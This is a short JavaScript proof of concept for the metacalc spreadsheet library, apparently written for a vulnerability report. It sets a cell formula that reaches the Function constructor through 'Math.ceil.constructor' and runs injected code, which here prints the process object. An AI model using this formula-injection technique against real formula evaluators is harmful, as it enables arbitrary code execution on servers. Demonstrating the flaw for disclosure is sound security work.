const { Sheet } = require('metacalc');

const sheet = new Sheet();

sheet.cells['A1'] = '=Math.ceil.constructor("console.log(process)")()';
console.log(sheet.values['A1']);

